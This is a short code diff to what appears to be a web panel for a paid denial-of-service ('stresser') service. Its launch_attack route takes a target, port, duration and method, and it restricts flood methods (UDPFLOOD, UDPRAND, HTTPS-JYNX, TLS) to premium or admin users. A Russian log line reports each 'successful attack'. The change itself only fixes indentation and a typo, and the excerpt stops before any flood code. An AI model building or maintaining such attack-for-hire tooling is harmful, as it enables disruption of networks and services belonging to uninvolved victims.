@@ -140,27 +140,27 @@ def launch_attack():
     port = request.form['port']
     duration = request.form['duration']
     method = request.form['method']
-    
+
     role = session.get('role', 'free')
 
-free_methods = ['FREE-scan']
-premium_methods = [
-    'UDPFLOOD',
-    'UDPRAND',
-    'HTTPS-JYNX',
-    'TLS'
-]
+    free_methods = ['FREE-scan']
+    premium_methods = [
+        'UDPFLOOD',
+        'UDPRAND',
+        'HTTPS-JYNX',
+        'TLS'
+    ]
 
-if role == 'admin':
-    pass
+    if role == 'admin':
+        pass
 
-elif role == 'premium':
-    if method not in free_methods + premium_methods:
-        return "Method not valid", 403
+    elif role == 'premium':
+        if method not in free_methods + premium_methods:
+            return "Method not valid", 403
 
-else:
-    if method not in free_methods:
-        return "Premium Acces", 403
+    else:
+        if method not in free_methods:
+            return "Premium Access", 403
         
     print(f"Успешная атака! Цель: {target}, Порт: {port}, Время: {duration} секунд, Метод: {method}")
     if method == "UDPFLOOD":
